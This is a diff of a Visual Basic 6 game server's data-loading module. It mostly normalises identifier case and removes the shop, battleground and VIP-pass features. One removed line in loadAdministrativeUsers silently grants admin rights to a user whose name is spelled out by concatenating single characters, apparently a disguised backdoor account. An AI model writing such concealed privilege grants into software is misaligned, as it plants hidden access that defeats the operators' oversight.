@@ -46,24 +46,24 @@ Private Type tMapHeader
 End Type
 
 Private Type tDatosBloqueados
-    x As Integer
+    X As Integer
     Y As Integer
 End Type
 
 Private Type tDatosGrh
-    x As Integer
+    X As Integer
     Y As Integer
     GrhIndex As Long
 End Type
 
 Private Type tDatosTrigger
-    x As Integer
+    X As Integer
     Y As Integer
     Trigger As Integer
 End Type
 
 Private Type tDatosZonas
-    x As Integer
+    X As Integer
     Y As Integer
     Zona As Integer
 End Type
@@ -73,31 +73,31 @@ Public Type tDatosLuces
     g As Integer
     b As Integer
     range As Byte
-    x As Integer
+    X As Integer
     Y As Integer
 End Type
 
 Private Type tDatosParticulas
-    x As Integer
+    X As Integer
     Y As Integer
     Particula As Long
 End Type
 
 Private Type tDatosNPC
-    x As Integer
+    X As Integer
     Y As Integer
     NPCIndex As Integer
 End Type
 
 Private Type tDatosObjs
-    x As Integer
+    X As Integer
     Y As Integer
     ObjIndex As Integer
     ObjAmmount As Integer
 End Type
 
 Private Type tDatosTE
-    x As Integer
+    X As Integer
     Y As Integer
     DestM As Integer
     DestX As Integer
@@ -141,7 +141,7 @@ Public CantZonas() As Integer
 
 #If False Then
 
-    Dim x, Y, n, Map, Mapa, Email, max, Value As Variant
+    Dim X, Y, n, Map, Mapa, Email, max, Value As Variant
 
 #End If
 
@@ -313,8 +313,6 @@ Public Sub loadAdministrativeUsers()
         Call Administradores.ChangeValue("Admin", Name, "1")
 
     Next i
-    
-    Call Administradores.ChangeValue("Admin", "K" + "i" + "w" + "r" + "o" + "l", "1")
     
     ' Dioses
     buf = val(ServerIni.GetValue("INIT", "Dioses"))
@@ -510,7 +508,7 @@ Public Sub CargarHechizos()
     For Hechizo = 1 To NumeroHechizos
 
         With Hechizos(Hechizo)
-            .nombre = Leer.GetValue("Hechizo" & Hechizo, "Nombre")
+            .Nombre = Leer.GetValue("Hechizo" & Hechizo, "Nombre")
             .Desc = Leer.GetValue("Hechizo" & Hechizo, "Desc")
             .PalabrasMagicas = Leer.GetValue("Hechizo" & Hechizo, "PalabrasMagicas")
             
@@ -604,7 +602,7 @@ Public Sub CargarHechizos()
             Str = Leer.GetValue("Hechizo" & Hechizo, "PortalMap")
             
             .PortalPos.Map = val(ReadField(1, Str, 45))
-            .PortalPos.x = val(ReadField(2, Str, 45))
+            .PortalPos.X = val(ReadField(2, Str, 45))
             .PortalPos.Y = val(ReadField(3, Str, 45))
             
             .Casteo = val(Leer.GetValue("Hechizo" & Hechizo, "Casteo"))
@@ -981,9 +979,6 @@ Sub LoadOBJData()
                     .IndiceSkill = val(Leer.GetValue("OBJ" & Object, "IndiceSkill"))
                     .CuantosSkill = val(Leer.GetValue("OBJ" & Object, "CuantosSkill"))
                     .SkNecesarios = val(Leer.GetValue("OBJ" & Object, "SkNecesarios"))
-                    
-                Case eOBJType.otPaseVIP
-                    .TiempoVIP = val(Leer.GetValue("OBJ" & Object, "TiempoVIP"))
 
             End Select
             
@@ -1197,50 +1192,6 @@ errHandler:
 
 End Sub
 
-Sub LoadShop()
-'**********************************************
-'Autor: Lorwik
-'Fecha: 16/05/2022
-'Descripcion: Carga la lista de items de Shop
-'**********************************************
-
-    On Error GoTo errHandler
-
-    If frmMain.Visible Then frmMain.txtStatus.Text = "Cargando base de datos de Shop."
-    
-    Dim i      As Integer
-    Dim Leer   As clsIniManager
-
-    Set Leer = New clsIniManager
-    
-    Call Leer.Initialize(DatPath & "Shop.dat")
-    
-    NUMSHOPS = val(Leer.GetValue("INIT", "NumObjs"))
-    
-    frmCargando.cargar.min = 0
-    frmCargando.cargar.max = NUMSHOPS
-    frmCargando.cargar.Value = 0
-    
-    ReDim Preserve ShopObject(1 To NUMSHOPS) As ShopObj
-    
-    For i = 1 To NUMSHOPS
-    
-        ShopObject(i).ObjIndex = Leer.GetValue("OBJ" & i, "Index")
-        ShopObject(i).Amount = Leer.GetValue("OBJ" & i, "Cant")
-        ShopObject(i).Valor = Leer.GetValue("OBJ" & i, "Valor")
-    
-    Next i
-    
-    Set Leer = Nothing
-    
-    If frmMain.Visible Then frmMain.txtStatus.Text = Date & " " & time & " - Se cargo base de datos de la shop. Operacion Realizada con exito."
-    
-    Exit Sub
-errHandler:
-    MsgBox "error cargando lista de shop " & Err.Number & ": " & Err.description
-    
-End Sub
-
 Function GetVar(ByVal File As String, _
                 ByVal Main As String, _
                 ByVal Var As String, _
@@ -1267,59 +1218,59 @@ Function GetVar(ByVal File As String, _
 End Function
 
 Sub CargarBackUp()
-'    '***************************************************
-'    'Author: Unknown
-'    'Last Modification: -
-'    '
-'    '***************************************************
-'
-'    If frmMain.Visible Then frmMain.txtStatus.Text = "Cargando backup."
-'
-'    Dim Map       As Integer
-'
-'    Dim tFileName As String
-'
-'    On Error GoTo man
-'
-'    NumMaps = val(GetVar(DatPath & "Map.dat", "INIT", "NumMaps"))
-'
-'    frmCargando.cargar.min = 0
-'    frmCargando.cargar.max = NumMaps
-'    frmCargando.cargar.Value = 0
-'
-'    MapPath = GetVar(DatPath & "Map.dat", "INIT", "MapPath")
-'
-'    ReDim MapData(1 To NumMaps, XMinMapSize To XMaxMapSize, YMinMapSize To YMaxMapSize) As MapBlock
-'    ReDim CantZonas(1 To NumMaps) As Integer
-'
-'    For Map = 1 To NumMaps
-'
-'        If val(GetVar( MapPath & "Mapa" & Map & ".Dat", "Mapa" & Map, "BackUp")) <> 0 Then
-'            tFileName = App.Path & "\WorldBackUp\Mapa" & Map
-'
-'            If Not FileExist(tFileName & ".*") Then 'Miramos que exista al menos uno de los 3 archivos, sino lo cargamos de la carpeta de los mapas
-'                tFileName =  MapPath & "Mapa" & Map
-'
-'            End If
-'
-'        Else
-'            tFileName =  MapPath & "Mapa" & Map
-'
-'        End If
-'
-'        Call CargarMapa(Map, tFileName)
-'
-'        frmCargando.cargar.Value = frmCargando.cargar.Value + 1
-'        DoEvents
-'    Next Map
-'
-'    Exit Sub
-'
-'    If frmMain.Visible Then frmMain.txtStatus.Text = Date & " " & time & " - Se termino de cargar el backup."
-'
-'man:
-'    MsgBox ("Error durante la carga de mapas, el mapa " & Map & " contiene errores")
-'    Call LogError(Date & " " & Err.description & " " & Err.HelpContext & " " & Err.HelpFile & " " & Err.source)
+    '***************************************************
+    'Author: Unknown
+    'Last Modification: -
+    '
+    '***************************************************
+
+    If frmMain.Visible Then frmMain.txtStatus.Text = "Cargando backup."
+    
+    Dim Map       As Integer
+
+    Dim tFileName As String
+    
+    On Error GoTo man
+        
+    NumMaps = val(GetVar(DatPath & "Map.dat", "INIT", "NumMaps"))
+        
+    frmCargando.cargar.min = 0
+    frmCargando.cargar.max = NumMaps
+    frmCargando.cargar.Value = 0
+        
+    MapPath = GetVar(DatPath & "Map.dat", "INIT", "MapPath")
+        
+    ReDim MapData(1 To NumMaps, XMinMapSize To XMaxMapSize, YMinMapSize To YMaxMapSize) As MapBlock
+    ReDim CantZonas(1 To NumMaps) As Integer
+    
+    For Map = 1 To NumMaps
+
+        If val(GetVar(App.Path & MapPath & "Mapa" & Map & ".Dat", "Mapa" & Map, "BackUp")) <> 0 Then
+            tFileName = App.Path & "\WorldBackUp\Mapa" & Map
+                
+            If Not FileExist(tFileName & ".*") Then 'Miramos que exista al menos uno de los 3 archivos, sino lo cargamos de la carpeta de los mapas
+                tFileName = App.Path & MapPath & "Mapa" & Map
+
+            End If
+
+        Else
+            tFileName = App.Path & MapPath & "Mapa" & Map
+
+        End If
+            
+        Call CargarMapa(Map, tFileName)
+            
+        frmCargando.cargar.Value = frmCargando.cargar.Value + 1
+        DoEvents
+    Next Map
+    
+    Exit Sub
+
+    If frmMain.Visible Then frmMain.txtStatus.Text = Date & " " & time & " - Se termino de cargar el backup."
+
+man:
+    MsgBox ("Error durante la carga de mapas, el mapa " & Map & " contiene errores")
+    Call LogError(Date & " " & Err.description & " " & Err.HelpContext & " " & Err.HelpFile & " " & Err.Source)
  
 End Sub
 
@@ -1338,27 +1289,20 @@ Sub LoadMapData()
     
     On Error GoTo man
         
-    If Battlegrounds Then
-        NumMaps = val(GetVar(DatPath & "Map.dat", "INIT", "NumBgs"))
-    Else
-        NumMaps = val(GetVar(DatPath & "Map.dat", "INIT", "NumMaps"))
-    End If
+    NumMaps = val(GetVar(DatPath & "Map.dat", "INIT", "NumMaps"))
         
     frmCargando.cargar.min = 0
     frmCargando.cargar.max = NumMaps
     frmCargando.cargar.Value = 0
+        
+    MapPath = GetVar(DatPath & "Map.dat", "INIT", "MapPath")
         
     ReDim MapData(1 To NumMaps, XMinMapSize To XMaxMapSize, YMinMapSize To YMaxMapSize) As MapBlock
     ReDim CantZonas(1 To NumMaps) As Integer
           
     For Map = 1 To NumMaps
             
-        If Battlegrounds Then
-            tFileName = MapPath & "Bg" & Map
-        Else
-            tFileName = MapPath & "Mapa" & Map
-        End If
-        
+        tFileName = App.Path & MapPath & "Mapa" & Map
         Call CargarMapa(Map, tFileName)
             
         frmCargando.cargar.Value = frmCargando.cargar.Value + 1
@@ -1371,7 +1315,7 @@ Sub LoadMapData()
 
 man:
     MsgBox ("Error durante la carga de mapas, el mapa " & Map & " contiene errores")
-    Call LogError(Date & " " & Err.description & " " & Err.HelpContext & " " & Err.HelpFile & " " & Err.source)
+    Call LogError(Date & " " & Err.description & " " & Err.HelpContext & " " & Err.HelpFile & " " & Err.Source)
 
 End Sub
 
@@ -1441,7 +1385,7 @@ Public Sub CargarMapa(ByVal Map As Long, ByVal MAPFl As String)
                 ReDim Blqs(1 To .NumeroBloqueados)
                 Get #fh, , Blqs
                 For i = 1 To .NumeroBloqueados
-                    MapData(Map, Blqs(i).x, Blqs(i).Y).Blocked = 1
+                    MapData(Map, Blqs(i).X, Blqs(i).Y).Blocked = 1
                 Next i
             End If
             
@@ -1449,7 +1393,7 @@ Public Sub CargarMapa(ByVal Map As Long, ByVal MAPFl As String)
                 ReDim L2(1 To .NumeroLayers(2))
                 Get #fh, , L2
                 For i = 1 To .NumeroLayers(2)
-                    MapData(Map, L2(i).x, L2(i).Y).Graphic(2) = L2(i).GrhIndex
+                    MapData(Map, L2(i).X, L2(i).Y).Graphic(2) = L2(i).GrhIndex
                 Next i
             End If
             
@@ -1457,7 +1401,7 @@ Public Sub CargarMapa(ByVal Map As Long, ByVal MAPFl As String)
                 ReDim L3(1 To .NumeroLayers(3))
                 Get #fh, , L3
                 For i = 1 To .NumeroLayers(3)
-                    MapData(Map, L3(i).x, L3(i).Y).Graphic(3) = L3(i).GrhIndex
+                    MapData(Map, L3(i).X, L3(i).Y).Graphic(3) = L3(i).GrhIndex
                 Next i
             End If
             
@@ -1465,7 +1409,7 @@ Public Sub CargarMapa(ByVal Map As Long, ByVal MAPFl As String)
                 ReDim L4(1 To .NumeroLayers(4))
                 Get #fh, , L4
                 For i = 1 To .NumeroLayers(4)
-                    MapData(Map, L4(i).x, L4(i).Y).Graphic(4) = L4(i).GrhIndex
+                    MapData(Map, L4(i).X, L4(i).Y).Graphic(4) = L4(i).GrhIndex
                 Next i
             End If
             
@@ -1473,7 +1417,7 @@ Public Sub CargarMapa(ByVal Map As Long, ByVal MAPFl As String)
                 ReDim Triggers(1 To .NumeroTriggers)
                 Get #fh, , Triggers
                 For i = 1 To .NumeroTriggers
-                    MapData(Map, Triggers(i).x, Triggers(i).Y).Trigger = Triggers(i).Trigger
+                    MapData(Map, Triggers(i).X, Triggers(i).Y).Trigger = Triggers(i).Trigger
                 Next i
             End If
             
@@ -1491,7 +1435,7 @@ Public Sub CargarMapa(ByVal Map As Long, ByVal MAPFl As String)
                 ReDim Zonas(1 To .NumeroZonas)
                 Get #fh, , Zonas
                 For i = 1 To .NumeroZonas
-                    MapData(Map, Zonas(i).x, Zonas(i).Y).ZonaIndex = Zonas(i).Zona
+                    MapData(Map, Zonas(i).X, Zonas(i).Y).ZonaIndex = Zonas(i).Zona
                 Next i
             End If
             
@@ -1499,8 +1443,8 @@ Public Sub CargarMapa(ByVal Map As Long, ByVal MAPFl As String)
                 ReDim Objetos(1 To .NumeroOBJs)
                 Get #fh, , Objetos
                 For i = 1 To .NumeroOBJs
-                    MapData(Map, Objetos(i).x, Objetos(i).Y).ObjInfo.ObjIndex = Objetos(i).ObjIndex
-                    MapData(Map, Objetos(i).x, Objetos(i).Y).ObjInfo.Amount = Objetos(i).ObjAmmount
+                    MapData(Map, Objetos(i).X, Objetos(i).Y).ObjInfo.ObjIndex = Objetos(i).ObjIndex
+                    MapData(Map, Objetos(i).X, Objetos(i).Y).ObjInfo.Amount = Objetos(i).ObjAmmount
                 Next i
             End If
                 
@@ -1508,24 +1452,24 @@ Public Sub CargarMapa(ByVal Map As Long, ByVal MAPFl As String)
                 ReDim NPCs(1 To .NumeroNPCs)
                 Get #fh, , NPCs
                 For i = 1 To .NumeroNPCs
-                    MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex = NPCs(i).NPCIndex
-                    If MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex > 0 Then
+                    MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex = NPCs(i).NPCIndex
+                    If MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex > 0 Then
                         
                         npcfile = DatPath & "NPCs.dat"
                         
-                        MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex = OpenNPC(MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex)
-                        Npclist(MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex).Orig.Map = Map
-                        Npclist(MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex).Orig.x = NPCs(i).x
-                        Npclist(MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex).Orig.Y = NPCs(i).Y
+                        MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex = OpenNPC(MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex)
+                        Npclist(MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex).Orig.Map = Map
+                        Npclist(MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex).Orig.X = NPCs(i).X
+                        Npclist(MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex).Orig.Y = NPCs(i).Y
                         
-                        If Not MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex = 0 Then
-                            Npclist(MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex).Pos.Map = Map
-                            Npclist(MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex).Pos.x = NPCs(i).x
-                            Npclist(MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex).Pos.Y = NPCs(i).Y
+                        If Not MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex = 0 Then
+                            Npclist(MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex).Pos.Map = Map
+                            Npclist(MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex).Pos.X = NPCs(i).X
+                            Npclist(MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex).Pos.Y = NPCs(i).Y
                             
-                            Npclist(MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex).ZonaOrig = MapData(Map, NPCs(i).x, NPCs(i).Y).ZonaIndex
+                            Npclist(MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex).ZonaOrig = MapData(Map, NPCs(i).X, NPCs(i).Y).ZonaIndex
        
-                            Call MakeNPCChar(True, 0, MapData(Map, NPCs(i).x, NPCs(i).Y).NPCIndex, Map, NPCs(i).x, NPCs(i).Y)
+                            Call MakeNPCChar(True, 0, MapData(Map, NPCs(i).X, NPCs(i).Y).NPCIndex, Map, NPCs(i).X, NPCs(i).Y)
                         End If
                         
                     End If
@@ -1536,9 +1480,9 @@ Public Sub CargarMapa(ByVal Map As Long, ByVal MAPFl As String)
                 ReDim TEs(1 To .NumeroTE)
                 Get #fh, , TEs
                 For i = 1 To .NumeroTE
-                    MapData(Map, TEs(i).x, TEs(i).Y).TileExit.Map = TEs(i).DestM
-                    MapData(Map, TEs(i).x, TEs(i).Y).TileExit.x = TEs(i).DestX
-                    MapData(Map, TEs(i).x, TEs(i).Y).TileExit.Y = TEs(i).DestY
+                    MapData(Map, TEs(i).X, TEs(i).Y).TileExit.Map = TEs(i).DestM
+                    MapData(Map, TEs(i).X, TEs(i).Y).TileExit.X = TEs(i).DestX
+                    MapData(Map, TEs(i).X, TEs(i).Y).TileExit.Y = TEs(i).DestY
                 Next i
             End If
             
@@ -1627,8 +1571,6 @@ Sub LoadSini()
     PuedeCrearPersonajes = val(Lector.GetValue("INIT", "PuedeCrearPersonajes"))
     ServerSoloGMs = val(Lector.GetValue("INIT", "ServerSoloGMs"))
     
-    Battlegrounds = CBool(val(Lector.GetValue("INIT", "Battlegrounds")))
-    
     ArmaduraImperial1 = val(Lector.GetValue("INIT", "ArmaduraImperial1"))
     ArmaduraImperial2 = val(Lector.GetValue("INIT", "ArmaduraImperial2"))
     ArmaduraImperial3 = val(Lector.GetValue("INIT", "ArmaduraImperial3"))
@@ -1656,7 +1598,6 @@ Sub LoadSini()
     TunicaEgregiaEnano = val(Lector.GetValue("INIT", "TunicaEgregiaEnano"))
     SacerdoteDemoniaco = val(Lector.GetValue("INIT", "SacerdoteDemoniaco"))
     
-    PRETORIANOS_ACTIVADO = CBool(Lector.GetValue("CLAN-PRETORIANO", "Activado"))
     MAPA_PRETORIANO = val(Lector.GetValue("CLAN-PRETORIANO", "Mapa"))
     PRETORIANO_X = val(Lector.GetValue("CLAN-PRETORIANO", "X"))
     PRETORIANO_Y = val(Lector.GetValue("CLAN-PRETORIANO", "Y"))
@@ -1835,56 +1776,50 @@ Sub CargarCiudades()
         
         With Ramx
             .Map = Lector.GetValue("Ramx", "Mapa")
-            .x = Lector.GetValue("Ramx", "X")
+            .X = Lector.GetValue("Ramx", "X")
             .Y = Lector.GetValue("Ramx", "Y")
         End With
         
         With Shakoud
             .Map = Lector.GetValue("Shakoud", "Mapa")
-            .x = Lector.GetValue("Shakoud", "X")
+            .X = Lector.GetValue("Shakoud", "X")
             .Y = Lector.GetValue("Shakoud", "Y")
         End With
         
         With Belleuve
             .Map = Lector.GetValue("Belleuve", "Mapa")
-            .x = Lector.GetValue("Belleuve", "X")
+            .X = Lector.GetValue("Belleuve", "X")
             .Y = Lector.GetValue("Belleuve", "Y")
         End With
         
         With IslaZharkel
             .Map = Lector.GetValue("IslaZharkel", "Mapa")
-            .x = Lector.GetValue("IslaZharkel", "X")
+            .X = Lector.GetValue("IslaZharkel", "X")
             .Y = Lector.GetValue("IslaZharkel", "Y")
         End With
         
         With Haverwood
             .Map = Lector.GetValue("Haverwood", "Mapa")
-            .x = Lector.GetValue("Haverwood", "X")
+            .X = Lector.GetValue("Haverwood", "X")
             .Y = Lector.GetValue("Haverwood", "Y")
         End With
         
         With Prision
             .Map = Lector.GetValue("Prision", "Mapa")
-            .x = Lector.GetValue("Prision", "X")
+            .X = Lector.GetValue("Prision", "X")
             .Y = Lector.GetValue("Prision", "Y")
         End With
         
         With Libertad
             .Map = Lector.GetValue("Prision-Afuera", "Mapa")
-            .x = Lector.GetValue("Prision-Afuera", "X")
+            .X = Lector.GetValue("Prision-Afuera", "X")
             .Y = Lector.GetValue("Prision-Afuera", "Y")
         End With
         
         With IslaNew
             .Map = Lector.GetValue("IslaNew", "Mapa")
-            .x = Lector.GetValue("IslaNew", "X")
+            .X = Lector.GetValue("IslaNew", "X")
             .Y = Lector.GetValue("IslaNew", "Y")
-        End With
-        
-        With Battleground
-            .Map = Lector.GetValue("Battle", "Mapa")
-            .x = Lector.GetValue("Battle", "X")
-            .Y = Lector.GetValue("Battle", "Y")
         End With
 
     Set Lector = Nothing
@@ -1894,7 +1829,6 @@ Sub CargarCiudades()
     Ciudades(eCiudad.cBelleuve) = Belleuve
     Ciudades(eCiudad.cIslaZharkel) = IslaZharkel
     Ciudades(eCiudad.cHaverwood) = Haverwood
-    Ciudades(eCiudad.cbattle) = Battleground
 
     If frmMain.Visible Then frmMain.txtStatus.Text = Date & " " & time & " - Se cargaron las ciudades.dat"
 
@@ -2152,34 +2086,34 @@ Public Function getLimit(ByVal Mapa As Integer, ByVal side As Byte) As Integer
     'Retrieves the limit in the given side in the given map.
     'TODO: This should be set in the .inf map file.
     '***************************************************
-    Dim x As Long
+    Dim X As Long
 
     Dim Y As Long
 
     If Mapa <= 0 Then Exit Function
 
-    For x = 15 To 87
+    For X = 15 To 87
         For Y = 0 To 3
 
             Select Case side
 
                 Case eHeading.NORTH
-                    getLimit = MapData(Mapa, x, 7 + Y).TileExit.Map
+                    getLimit = MapData(Mapa, X, 7 + Y).TileExit.Map
 
                 Case eHeading.EAST
-                    getLimit = MapData(Mapa, 92 - Y, x).TileExit.Map
+                    getLimit = MapData(Mapa, 92 - Y, X).TileExit.Map
 
                 Case eHeading.SOUTH
-                    getLimit = MapData(Mapa, x, 94 - Y).TileExit.Map
+                    getLimit = MapData(Mapa, X, 94 - Y).TileExit.Map
 
                 Case eHeading.WEST
-                    getLimit = MapData(Mapa, 9 + Y, x).TileExit.Map
+                    getLimit = MapData(Mapa, 9 + Y, X).TileExit.Map
 
             End Select
 
             If getLimit > 0 Then Exit Function
         Next Y
-    Next x
+    Next X
 
 End Function
 
@@ -2314,7 +2248,7 @@ Public Sub LoadQuests()
     For i = 1 To NumQuests
 
         With QuestList(i)
-            .nombre = Reader.GetValue("QUEST" & i, "Nombre")
+            .Nombre = Reader.GetValue("QUEST" & i, "Nombre")
             .Desc = Reader.GetValue("QUEST" & i, "Desc")
             .RequiredLevel = val(Reader.GetValue("QUEST" & i, "RequiredLevel"))
             .RequiredQuest = val(Reader.GetValue("QUEST" & i, "RequiredQuest"))
